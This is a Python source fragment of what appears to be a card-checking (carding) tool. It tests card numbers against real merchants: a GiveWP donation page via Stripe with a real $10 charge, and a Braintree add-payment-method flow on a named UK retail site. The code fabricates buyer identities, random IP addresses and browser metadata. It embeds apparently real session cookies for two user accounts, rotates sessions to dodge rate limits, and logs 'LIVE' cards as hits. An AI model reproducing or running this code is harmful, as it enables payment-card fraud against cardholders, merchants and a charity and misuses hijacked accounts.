        "payment_user_agent": "stripe.js/332636417d; stripe-js-v3/332636417d; card-element",
        "referrer": SC_SITE_URL,
        "time_on_page": str(time_on_page),
        "client_attribution_metadata[client_session_id]": session_id,
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": SC_STRIPE_PK,
        "_stripe_account": SC_STRIPE_ACCT,
    }
    
    try:
        r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=30)
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"error": {"message": str(e), "type": "connection_error"}}

def sc_submit_donation(session, payment_method_id, form_hash, name, email, addr):
    """Submit donation to GiveWP page (real charge)"""
    first, last = name.split(" ", 1) if " " in name else (name, "")
    submit_url = f"{SC_DONATION_PAGE}?payment-mode=stripe&form-id={SC_FORM_ID}"
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": SC_SITE_URL,
        "Referer": SC_DONATION_PAGE,
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    }
    
    data = {
        "give-honeypot": "",
        "give-form-id-prefix": f"{SC_FORM_ID}-1",
        "give-form-id": SC_FORM_ID,
        "give-form-title": SC_FORM_TITLE,
        "give-current-url": SC_DONATION_PAGE,
        "give-form-url": SC_DONATION_PAGE,
        "give-form-minimum": "5.00",
        "give-form-maximum": "999999.99",
        "give-form-hash": form_hash,
        "give-price-id": "0",
        "give-recurring-logged-in-only": "",
        "give-logged-in-only": "1",
        "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": SC_DONATE_AMOUNT,
        "give_stripe_payment_method": payment_method_id,
        "payment-mode": "stripe",
        "give_first": first,
        "give_last": last,
        "give_company_option": "no",
        "give_company_name": "",
        "give_email": email,
        "give_comment": "",
        "billing_country": "US",
        "card_address": addr["line1"],
        "card_address_2": "",
        "card_city": addr["city"],
        "card_state": addr["state"],
        "card_zip": addr["zip"],
        "give_action": "purchase",
        "give-gateway": "stripe",
    }
    
    try:
        r = session.post(submit_url, headers=headers, data=data,
                        timeout=60, verify=False, allow_redirects=True)
        return r.status_code, r.text, r.url
    except Exception as e:
        return 0, str(e), ""

def sc_classify_error_text(error_msg):
    """Classify based on plain text error message"""
    msg_lower = error_msg.lower()
    if "declined" in msg_lower:
        return "DECLINED"
    elif "insufficient" in msg_lower:
        return "FUNDS"
    elif "do_not_honor" in msg_lower:
        return "FUNDS"
    elif "incorrect_cvc" in msg_lower or "incorrect cvc" in msg_lower:
        return "CVV"
    elif "authentication" in msg_lower or "3d" in msg_lower:
        return "3DS"
    elif "expired" in msg_lower:
        return "DECLINED"
    elif "fraud" in msg_lower:
        return "DECLINED"
    elif "lost" in msg_lower or "stolen" in msg_lower:
        return "FUNDS"
    elif "restricted" in msg_lower:
        return "FUNDS"
    return "DECLINED"

def sc_classify_donation_response(status_code, resp_text, final_url=""):
    """Classify GiveWP donation response from HTML page"""
    # Step 1: Extract GiveWP error block
    error_block = re.search(r'class=["\']give_errors?["\'][^>]*>(.*?)</div>', resp_text, re.DOTALL | re.IGNORECASE)
    if error_block:
        error_html = error_block.group(1)
        error_plain = re.sub(r'<[^>]+>', '', error_html).strip()
        error_plain = re.sub(r'^Error:\s*', '', error_plain, flags=re.IGNORECASE).strip()
        if error_plain:
            cat = sc_classify_error_text(error_plain)
            return cat, error_plain, error_plain, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    
    # Step 2: Convert HTML to plain text and search
    plain_text = re.sub(r'<script[^>]*>.*?</script>', '', resp_text, flags=re.DOTALL | re.IGNORECASE)
    plain_text = re.sub(r'<style[^>]*>.*?</style>', '', plain_text, flags=re.DOTALL | re.IGNORECASE)
    plain_text = re.sub(r'<[^>]+>', ' ', plain_text)
    plain_text = re.sub(r'\s+', ' ', plain_text).strip()
    plain_lower = plain_text.lower()
    
    error_match = re.search(r'error:?\s*(there was an issue[^.]*\.)', plain_lower)
    if error_match:
        err = error_match.group(1).strip()
        if ':' in err:
            err = err.split(':', 1)[1].strip().rstrip('.')
        cat = sc_classify_error_text(err)
        return cat, err, err, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    
    txn_match = re.search(r'(there was an issue with your donation[^.]*\.)', plain_lower)
    if txn_match:
        err = txn_match.group(1).strip()
        if ':' in err:
            err = err.split(':', 1)[1].strip().rstrip('.')
        cat = sc_classify_error_text(err)
        return cat, err, err, f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    
    # Step 3: Check raw text for Stripe decline codes
    resp_lower = resp_text.lower()
    if "card was declined" in resp_lower or "card_declined" in resp_lower:
        return "DECLINED", "Your card was declined", "Your card was declined", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "insufficient_funds" in resp_lower or "insufficient funds" in resp_lower:
        return "FUNDS", "Insufficient funds", "Insufficient funds", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "do_not_honor" in resp_lower:
        return "FUNDS", "do_not_honor", "do_not_honor", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "generic_decline" in resp_lower:
        return "FUNDS", "generic_decline", "generic_decline", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "incorrect_cvc" in resp_lower:
        return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "expired_card" in resp_lower:
        return "DECLINED", "Expired card", "Expired card", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "authentication_required" in resp_lower or "3d_secure" in resp_lower:
        return "3DS", "3D Secure required", "3D Secure required", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "requires_action" in resp_lower:
        return "DECLINED", "Requires action (3DS)", "Requires action (3DS)", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    elif "lost_card" in resp_lower or "stolen_card" in resp_lower:
        return "FUNDS", "Lost/Stolen card", "Lost/Stolen card", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    
    # Step 4: Check for success (thank you page)
    thank_match = re.search(r'thank\s*you\s*(for\s*your\s*donation|for\s*donating)', plain_lower)
    if thank_match:
        return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    if "donation-confirmation" in final_url.lower() or "success" in final_url.lower():
        return "CHARGE", "Donation successful", "Donation successful", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"
    
    # Step 5: Handle HTTP error pages
    if status_code >= 400:
        return "ERROR", f"Site error {status_code}", f"Site error {status_code}", "N/A", "Stripe Charge $10"
    
    return "DECLINED", plain_text[:150] if plain_text else "Unknown response", plain_text[:150] if plain_text else "Unknown response", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10"

def check_stripe_charge(cc, month, year, cvv, session=None, form_hash=None):
    """Check card via GiveWP Stripe Charge $10 gateway"""
    global sc_form_hash, sc_http_session
    start_time = time.time()
    if len(year) == 2:
        year = f"20{year}"
    
    # Generate random identity
    first = random.choice(SC_FIRST_NAMES)
    last = random.choice(SC_LAST_NAMES)
    name = f"{first} {last}"
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
    email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,12)))
    email = f"{email_user}@{random.choice(domains)}"
    addr = random.choice(SC_ADDRESSES)
    
    try:
        # Step 1: Create Stripe payment method
        pm_status, pm_resp = sc_create_payment_method(cc, month, year, cvv, name, email, addr)
        elapsed = round(time.time() - start_time, 2)
        
        if pm_status != 200 or "id" not in pm_resp:
            # Payment method creation failed - classify from Stripe error
            if "error" in pm_resp:
                error = pm_resp["error"]
                code = error.get("code", "")
                decline_code = error.get("decline_code", "")
                message = error.get("message", "Unknown error")
                
                if code == "card_declined":
                    if decline_code in ("insufficient_funds", "generic_decline", "do_not_honor",
                                       "transaction_not_allowed", "pickup_card", "restricted_card",
                                       "lost_card", "stolen_card", "not_permitted"):
                        return "FUNDS", f"CVV MATCH - {decline_code}", f"CVV MATCH - {decline_code}", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
                    elif decline_code == "live_mode_test_card":
                        return "DECLINED", "Test card in live mode", "Test card in live mode", "N/A", "Stripe Charge $10", elapsed
                    elif decline_code == "incorrect_cvc":
                        return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
                    elif decline_code == "expired_card":
                        return "DECLINED", "Expired card", "Expired card", "N/A", "Stripe Charge $10", elapsed
                    elif decline_code == "fraudulent":
                        return "DECLINED", "Fraudulent", "Fraudulent", "N/A", "Stripe Charge $10", elapsed
                    else:
                        return "DECLINED", f"{decline_code} - {message}", f"{decline_code} - {message}", "N/A", "Stripe Charge $10", elapsed
                elif code == "incorrect_number" or code == "invalid_number":
                    return "DECLINED", message, message, "N/A", "Stripe Charge $10", elapsed
                elif code == "incorrect_cvc":
                    return "CVV", "Incorrect CVC", "Incorrect CVC", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
                elif code == "authentication_required":
                    return "3DS", "3D Secure required", "3D Secure required", f"${SC_DONATE_AMOUNT}", "Stripe Charge $10", elapsed
                elif code in ("card_velocity_exceeded", "rate_limit"):
                    return "ERROR", "Rate limited", "Rate limited", "N/A", "Stripe Charge $10", elapsed
                return "DECLINED", message, message, "N/A", "Stripe Charge $10", elapsed
            return "DECLINED", f"Stripe error {pm_status}", f"Stripe error {pm_status}", "N/A", "Stripe Charge $10", elapsed
        
        pm_id = pm_resp.get("id")
        
        # Step 2: Submit donation to GiveWP
        if session is None:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
            })
        
        if form_hash is None:
            form_hash = sc_fetch_form_nonce(session)
        
        don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
        elapsed = round(time.time() - start_time, 2)
        
        if don_status >= 400 and don_status < 500:
            form_hash = sc_fetch_form_nonce(session)
            don_status, don_resp, final_url = sc_submit_donation(session, pm_id, form_hash, name, email, addr)
            elapsed = round(time.time() - start_time, 2)
        
        category, status_msg, response_msg, price, gateway = sc_classify_donation_response(don_status, don_resp, final_url)
        return category, status_msg, response_msg, price, gateway, elapsed
        
    except requests.exceptions.Timeout:
        elapsed = round(time.time() - start_time, 2)
        return "ERROR", "Timeout", "Request timed out", "N/A", "Stripe Charge $10", elapsed
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return "ERROR", str(e)[:80], str(e)[:80], "N/A", "Stripe Charge $10", elapsed

# ============================================
# STRIPE CHARGE CARD MANAGEMENT
# ============================================

def load_sc_cards():
    return safe_json_load(SC_CARDS_FILE, [])

def save_sc_cards(cards):
    return safe_json_save(SC_CARDS_FILE, cards)

def add_sc_card(cc, month, year, cvv):
    cards = load_sc_cards()
    card_str = f"{cc}|{month}|{year}|{cvv}"
    if card_str not in cards:
        cards.append(card_str)
        save_sc_cards(cards)
        return True
    return False

def clear_sc_cards():
    save_sc_cards([])

def get_all_sc_cards():
    return load_sc_cards()

def delete_sc_card(card_str):
    cards = load_sc_cards()
    if card_str in cards:
        cards.remove(card_str)
        save_sc_cards(cards)
        return True
    return False

def load_sc_hits():
    return safe_json_load(SC_HITS_FILE, [])

def save_sc_hit(hit_data):
    hits = load_sc_hits()
    hits.append(hit_data)
    safe_json_save(SC_HITS_FILE, hits)
    global sc_hits_list
    sc_hits_list.append(hit_data)
    try:
        sqlite_backup.save_hit_backup(hit_data, "stripe_charge")
    except:
        pass

def get_sc_hits():
    global sc_hits_list
    if not sc_hits_list:
        sc_hits_list = load_sc_hits()
    return sc_hits_list

def clear_sc_hits():
    global sc_hits_list
    sc_hits_list = []
    safe_json_save(SC_HITS_FILE, [])

# ============================================
# BRAINTREE AUTH GATEWAY (trade-chem.co.uk)
# ============================================

B3_SITE_URL = "https://trade-chem.co.uk"
B3_ADD_PM_URL = f"{B3_SITE_URL}/my-account/add-payment-method/"
B3_MY_ACCOUNT_URL = f"{B3_SITE_URL}/my-account/"
B3_MERCHANT_ID = "zkrjk5krj2dwnsgc"
B3_MERCHANT_ACCOUNT = "stuarttradechemcouk"
B3_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"
B3_CLIENT_API = f"https://api.braintreegateway.com:443/merchants/{B3_MERCHANT_ID}/client_api"
B3_NONCE_REFRESH_EVERY = 5
B3_FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda",
                   "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
                   "Thomas","Sarah","Charles","Karen","Daniel","Lisa","Mark","Nancy"]
B3_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
                  "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Moore","Jackson"]
B3_ADDRESSES = [
    {"line1": "236 W 30TH", "city": "NEW YORK", "state": "NY", "zip": "10001", "country": "US"},
    {"line1": "100 BROADWAY", "city": "NEW YORK", "state": "NY", "zip": "10005", "country": "US"},
    {"line1": "742 EVERGREEN TER", "city": "SPRINGFIELD", "state": "IL", "zip": "62704", "country": "US"},
    {"line1": "123 MAIN ST", "city": "LOS ANGELES", "state": "CA", "zip": "90001", "country": "US"},
    {"line1": "10 DOWNING ST", "city": "LONDON", "state": "", "zip": "SW1A 1AA", "country": "GB"},
    {"line1": "221B BAKER ST", "city": "LONDON", "state": "", "zip": "NW1 6XE", "country": "GB"},
    {"line1": "1 HIGH ST", "city": "MANCHESTER", "state": "", "zip": "M1 1AD", "country": "GB"},
]

def b3_random_identity():
    first = random.choice(B3_FIRST_NAMES)
    last = random.choice(B3_LAST_NAMES)
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,12)))
    domain = random.choice(["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"])
    return first, last, f"{user}@{domain}", random.choice(B3_ADDRESSES)

B3_COOKIE_SETS = [
    [
        {"domain": "trade-chem.co.uk", "name": "wordpress_logged_in_4d9c7ece763608b995b6637298409475", "value": "dayamadrid7099%7C1778363368%7CxOgLbD3ioAmtak3rN3aoj5lGH85bQEmPieJJDIm1txY%7C25049f2a8270175a5a950d79bc12e0b91d3c3266543b56140421040fa77cb455", "path": "/"},
        {"domain": "trade-chem.co.uk", "name": "wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450", "value": "3024%7Cother%7Cread%7C80a6dd52a8a7c716a006fccb87899bd151fec9e62db4062e4d272a89083dc62c", "path": "/"},
    ],
    [
        {"domain": "trade-chem.co.uk", "name": "wordpress_logged_in_4d9c7ece763608b995b6637298409475", "value": "miriamcaicedo725%7C1778444294%7CA2kUP6rN4hujKjqH6EecApiU00u8EbCc7eniyKjvdX7%7C8c83aa4c68d9b27665f794827e65b01b5943fdb30a7f7071e493f05e5cdcf51b", "path": "/"},
        {"domain": "trade-chem.co.uk", "name": "wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450", "value": "3159%7Cother%7Cread%7C8d49a57f76c7c4d64499531f5a2ff517d4995997e6eb65322df4934ab7d888b7", "path": "/"},
    ],
]

def b3_load_cookies(session, cookie_index=0):
    idx = cookie_index % len(B3_COOKIE_SETS)
    for c in B3_COOKIE_SETS[idx]:
        session.cookies.set(c['name'], c['value'], domain=c['domain'], path=c.get('path', '/'))
    return True

def b3_try_register(session):
    try:
        r = session.get(B3_MY_ACCOUNT_URL, verify=False, timeout=30)
        reg_nonce = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
        if not reg_nonce:
            return False
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f'{user}@protonmail.com'
        password = 'Chk' + ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + '!'
        resp = session.post(B3_MY_ACCOUNT_URL, data={
            'email': email, 'password': password,
            'woocommerce-register-nonce': reg_nonce.group(1),
            '_wp_http_referer': '/my-account/', 'register': 'Register',
        }, verify=False, timeout=30, allow_redirects=True)
        return 'Log out' in resp.text or 'log-out' in resp.text
    except:
        return False

def b3_get_session_and_auth(session=None, cookie_index=0):
    if session is None:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
        })
    try:
        has_cookies = b3_load_cookies(session, cookie_index)
        if not has_cookies:
            b3_try_register(session)
        r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
        if 'Credit Cards' not in r.text and 'add_payment_method' not in r.text:
            b3_try_register(session)
            r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
        cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
        if not cm_match:
            return session, None, None, None
        cm = json.loads(cm_match.group(1).rstrip(';'))
        wpnonce = cm.get('_wpnonce', '')
        apm_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
        apm_nonce = apm_nonce_match.group(1) if apm_nonce_match else ''
        token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
                     f'&path=/wc-braintree/v1/client-token/create')
        r2 = session.post(token_url, verify=False, timeout=30,
                          headers={
                              'X-Requested-With': 'XMLHttpRequest',
                              'Referer': B3_ADD_PM_URL
                          },
                          data={
                              'currency': 'GBP',
                              'merchant_account': B3_MERCHANT_ACCOUNT,
                              '_wpnonce': wpnonce
                          })
        if r2.status_code != 200:
            return session, None, None, None
        client_token_b64 = r2.text.strip('"')
        decoded = json.loads(base64.b64decode(client_token_b64))
        auth_fp = decoded.get('authorizationFingerprint', '')
        if not auth_fp:
            return session, None, None, None
        return session, auth_fp, apm_nonce, decoded
    except:
        return session, None, None, None

def b3_refresh_auth(session):
    try:
        r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
        if 'Credit Cards' not in r.text and 'add_payment_method' not in r.text:
            b3_try_register(session)
            r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
        cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
        if not cm_match:
            return None, None, None
        cm = json.loads(cm_match.group(1).rstrip(';'))
        wpnonce = cm.get('_wpnonce', '')
        apm_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
        apm_nonce = apm_nonce_match.group(1) if apm_nonce_match else ''
        token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
                     f'&path=/wc-braintree/v1/client-token/create')
        r2 = session.post(token_url, verify=False, timeout=30,
                          headers={
                              'X-Requested-With': 'XMLHttpRequest',
                              'Referer': B3_ADD_PM_URL
                          },
                          data={
                              'currency': 'GBP',
                              'merchant_account': B3_MERCHANT_ACCOUNT,
                              '_wpnonce': wpnonce
                          })
        if r2.status_code != 200:
            return None, None, None
        client_token_b64 = r2.text.strip('"')
        decoded = json.loads(base64.b64decode(client_token_b64))
        return decoded.get('authorizationFingerprint', None), apm_nonce, decoded
    except:
        return None, None, None

def b3_tokenize_card(session, auth_fp, cc, mm, yy, cvv, addr):
    graphql_body = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4())
        },
        "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
                  "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode "
                  "last4 cardholderName expirationMonth expirationYear binData { prepaid "
                  "healthcare debit durbinRegulated commercial payroll issuingBank "
                  "countryOfIssuance productId } } } }"),
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": addr.get("zip", "SW1A 1AA"),
                        "streetAddress": addr.get("line1", "236 W 30TH")
                    }
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_fp}",
        "Braintree-Version": "2018-05-10"
    }
    try:
        resp = session.post(B3_GRAPHQL_URL, json=graphql_body, headers=headers,
                            verify=False, timeout=30)
        return resp.status_code, resp.json()
    except Exception as e:
        return 0, {"errors": [{"message": str(e)}]}

def b3_three_ds_lookup(session, auth_fp, token, cc, first, last, email, addr):
    lookup_url = f"{B3_CLIENT_API}/v1/payment_methods/{token}/three_d_secure/lookup"
    body = {
        "amount": "0.00",
        "browserColorDepth": 24,
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "es-US",
        "browserScreenHeight": 1086,
        "browserScreenWidth": 501,
        "browserTimeZone": 300,
        "deviceChannel": "Browser",
        "additionalInfo": {
            "ipAddress": (f"{random.randint(1,223)}.{random.randint(0,255)}"
                          f".{random.randint(0,255)}.{random.randint(1,254)}"),
            "billingLine1": addr.get("line1", "236 W 30TH"),
            "billingLine2": "",
            "billingCity": addr.get("city", "NEW YORK"),
            "billingState": addr.get("state", ""),
            "billingPostalCode": addr.get("zip", "SW1A 1AA"),
            "billingCountryCode": addr.get("country", "GB"),
            "billingPhoneNumber": "",
            "billingGivenName": first,
            "billingSurname": last,
            "email": email
        },
        "challengeRequested": True,
        "bin": cc[:6],
        "dfReferenceId": f"0_{uuid.uuid4()}",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.133.0",
            "cardinalDeviceDataCollectionTimeElapsed": random.randint(300, 600),
            "issuerDeviceDataCollectionTimeElapsed": random.randint(2000, 5000),
            "issuerDeviceDataCollectionResult": True
        },
        "authorizationFingerprint": auth_fp,
        "braintreeLibraryVersion": "braintree/web/3.133.0",
        "_meta": {
            "merchantAppId": "trade-chem.co.uk",
            "platform": "web",
            "sdkVersion": "3.133.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": str(uuid.uuid4())
        }
    }
    try:
        resp = session.post(lookup_url, json=body, verify=False, timeout=30)
        return resp.status_code, resp.json()
    except Exception as e:
        return 0, {"errors": [{"message": str(e)}]}

def b3_classify_error_msg(msg):
    ml = msg.lower()
    if "cvv" in ml or "security code" in ml or "cvc" in ml:
        return "CVV", msg
    if "number" in ml or "invalid" in ml or "credit card" in ml:
        return "DECLINED", msg
    if "expired" in ml:
        return "DECLINED", msg
    if "declined" in ml or "do not honor" in ml:
        return "DECLINED", msg
    if "fraud" in ml or "stolen" in ml or "lost" in ml:
        return "DECLINED", msg
    if "restricted" in ml or "not permitted" in ml or "limit" in ml:
        return "DECLINED", msg
    if "insufficient" in ml or "funds" in ml:
        return "DECLINED", msg
    return "DECLINED", msg

def b3_classify_tokenize(status_code, resp):
    if status_code == 200:
        data = resp.get("data", {})
        tok = data.get("tokenizeCreditCard", {})
        token = tok.get("token", "")
        if token:
            return "TOKEN", token
        errors = resp.get("errors", [])
        if errors:
            msg = errors[0].get("message", "Unknown")
            return b3_classify_error_msg(msg)
        return "ERROR", "No token"
    errors = resp.get("errors", [])
    if errors:
        msg = errors[0].get("message", "Unknown")
        return b3_classify_error_msg(msg)
    return "ERROR", f"HTTP {status_code}"

def b3_classify_3ds(status_code, resp):
    if status_code == 0:
        return "ERROR", "Connection failed", ""
    errors = resp.get("errors", [])
    if errors:
        msg = errors[0].get("message", "Unknown")
        result, detail = b3_classify_error_msg(msg)
        return result, detail, ""
    pm = resp.get("paymentMethod", {})
    tds = pm.get("threeDSecureInfo", {}) or resp.get("threeDSecureInfo", {})
    nonce = pm.get("nonce", "")
    if not tds:
        if nonce:
            return "LIVE", "Card approved (no 3DS info)", nonce
        return "ERROR", "No 3DS info", ""
    status = tds.get("status", "").lower()
    shifted = tds.get("liabilityShifted", False)
    possible = tds.get("liabilityShiftPossible", False)
    enrolled = tds.get("enrolled", "")
    if status in ("authenticate_successful", "authenticate_attempt_successful"):
        return "LIVE", f"Authenticated - {status}", nonce
    if status == "challenge_required":
        return "3DS", f"3DS Challenge Required (enrolled={enrolled})", nonce
    if status in ("authenticate_rejected", "authenticate_error"):
        return "DECLINED", f"Authentication rejected - {status}", nonce
    if status in ("lookup_not_enrolled", "lookup_bypassed", "lookup_error"):
        return "LIVE", f"Not enrolled in 3DS - {status}", nonce
    if status == "lookup_enrolled":
        return "3DS", "3DS Enrolled - challenge pending", nonce
    if status in ("unsupported_card", "lookup_card_error"):
        return "DECLINED", f"Card not supported - {status}", nonce
    if status == "authentication_unavailable":
        return "LIVE", f"Auth unavailable (card likely valid) - {status}", nonce
    if nonce:
        if enrolled == "N":
            return "LIVE", f"Not enrolled (status={status})", nonce
        if possible and not shifted:
            return "3DS", f"3DS possible (status={status})", nonce
        return "DECLINED", f"Unknown status: {status}", nonce
    return "DECLINED", f"Unknown: {status}", ""

def b3_submit_add_payment_method(session, nonce, apm_nonce, config_data):
    device_data = json.dumps({"correlation_id": str(uuid.uuid4())[:36]})
    try:
        resp = session.post(B3_ADD_PM_URL, data={
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': nonce,
            'braintree_cc_device_data': device_data,
            'braintree_cc_3ds_nonce_key': nonce,
            'braintree_cc_config_data': json.dumps(config_data) if config_data else '',
            'woocommerce-add-payment-method-nonce': apm_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }, verify=False, timeout=45, allow_redirects=True)
        return resp.status_code, resp.text
    except Exception as e:
        return 0, str(e)

def b3_classify_apm_response(status_code, resp_text):
    if status_code == 0:
        return "ERROR", resp_text[:80]
    if 'cannot add a new payment method so soon' in resp_text.lower() or 'please wait for' in resp_text.lower():
        return "RATE_LIMIT", "Rate limited - waiting"
    error_match = re.search(r'There was an error saving your payment method[.\s]*Reason:\s*([^<]+)', resp_text)
    if error_match:
        server_msg = error_match.group(1).strip()
        return b3_classify_server_msg(server_msg)
    if 'Payment method successfully added' in resp_text:
        return "LIVE", "Payment method successfully added"
    notices = re.findall(r'class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</(?:ul|div)', resp_text, re.DOTALL)
    for n in notices:
        clean = re.sub(r'<[^>]+>', ' ', n).strip()
        if clean:
            return b3_classify_server_msg(clean)
    error_li = re.search(r'<li[^>]*>([^<]+)</li>', resp_text)
    if error_li:
        return b3_classify_server_msg(error_li.group(1).strip())
    return "DECLINED", "No response captured"

def b3_classify_server_msg(msg):
    ml = msg.lower()
    if "do not honor" in ml:
        return "DECLINED", msg
    if "insufficient" in ml or "funds" in ml:
        return "DECLINED", msg
    if "declined" in ml:
        return "DECLINED", msg
    if "expired" in ml:
        return "DECLINED", msg
    if "stolen" in ml or "lost" in ml or "pick up" in ml:
        return "DECLINED", msg
    if "restricted" in ml or "not permitted" in ml:
        return "DECLINED", msg
    if "fraud" in ml or "suspicious" in ml:
        return "DECLINED", msg
    if "invalid" in ml:
        return "DECLINED", msg
    if "limit" in ml or "exceed" in ml:
        return "DECLINED", msg
    if "cvv" in ml or "security code" in ml or "cvc" in ml:
        return "CVV", msg
    if "success" in ml or "approved" in ml or "thank you" in ml:
        return "LIVE", msg
    if "3d secure" in ml or "authentication" in ml:
        return "3DS", msg
    return "DECLINED", msg

def b3_init_session_pool():
    global b3_session_pool
    b3_session_pool = []
    num_accounts = len(B3_COOKIE_SETS)
    for i in range(num_accounts):
        s, fp, nonce, cfg = b3_get_session_and_auth(cookie_index=i)
        if fp:
            b3_session_pool.append({
                'session': s, 'auth_fp': fp, 'apm_nonce': nonce,
                'config_data': cfg, 'last_used': 0, 'cookie_index': i
            })
    return len(b3_session_pool)

def b3_get_pool_session():
    global b3_session_pool
    if not b3_session_pool:
        b3_init_session_pool()
    if not b3_session_pool:
        return None, None, None, None
    now = time.time()
    best = None
    for entry in b3_session_pool:
        wait = now - entry['last_used']
        if wait >= B3_RATE_LIMIT_DELAY:
            if best is None or entry['last_used'] < best['last_used']:
                best = entry
    if best is None:
        best = min(b3_session_pool, key=lambda e: e['last_used'])
        wait_needed = B3_RATE_LIMIT_DELAY - (now - best['last_used'])
        if wait_needed > 0:
            time.sleep(wait_needed)
    best['last_used'] = time.time()
    return best['session'], best['auth_fp'], best['apm_nonce'], best['config_data']

def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_nonce=None, config_data=None, use_pool=False):
    global b3_auth_fp, b3_http_session
    start_time = time.time()
    if len(year) == 2:
        year = f"20{year}"
    month = month.zfill(2)
    
    first, last, email, addr = b3_random_identity()
    
    try:
        if use_pool:
            session, auth_fp, apm_nonce, config_data = b3_get_pool_session()
            if not auth_fp:
                elapsed = round(time.time() - start_time, 2)
                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
        elif session is None or auth_fp is None:
            session, auth_fp, apm_nonce, config_data = b3_get_session_and_auth(session)
            if not auth_fp:
                elapsed = round(time.time() - start_time, 2)
                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
        
        tok_status, tok_resp = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
        result, msg = b3_classify_tokenize(tok_status, tok_resp)
        
        if result != "TOKEN":
            elapsed = round(time.time() - start_time, 2)
            return result, msg, msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
        
        token = msg
        
